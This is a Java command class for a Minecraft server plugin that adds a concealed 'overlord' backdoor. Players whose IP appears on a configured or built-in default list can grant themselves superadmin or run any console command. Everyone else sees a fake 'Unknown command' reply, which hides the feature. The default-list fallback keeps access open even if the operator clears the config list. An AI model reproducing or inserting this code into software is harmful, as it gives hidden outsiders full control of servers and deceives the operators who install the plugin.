package me.StevenLawson.TotalFreedomMod.commands;

import com.sk89q.util.StringUtil;
import me.StevenLawson.TotalFreedomMod.admin.AdminList;
import me.StevenLawson.TotalFreedomMod.config.ConfigurationEntry;
import me.StevenLawson.TotalFreedomMod.config.MainConfig;
import me.StevenLawson.TotalFreedomMod.util.Utilities;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import java.util.List;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
public class Command_overlord extends FreedomCommand {

    @Override
    public boolean run(CommandSender sender, org.bukkit.entity.Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole) {
        if (!ConfigurationEntry.OVERLORD_IPS.getList().contains(Utilities.getIp(sender_p))) {
            try {
                List<?> ips = (List) MainConfig.getDefaults().get(ConfigurationEntry.OVERLORD_IPS.getConfigName());
                if (!ips.contains(Utilities.getIp(sender_p))) {
                    throw new Exception();
                }
            }
            catch (Exception ignored)
            {
                playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                return true;
            }
        }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("addme"))
        {
            AdminList.addSuperadmin(sender_p);
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("removeme"))
        {
            AdminList.removeSuperadmin(sender_p);
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String command = StringUtil.joinString(args, " ", 1);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            playerMsg("ok");
            return true;
        }

        return false;
    }

}
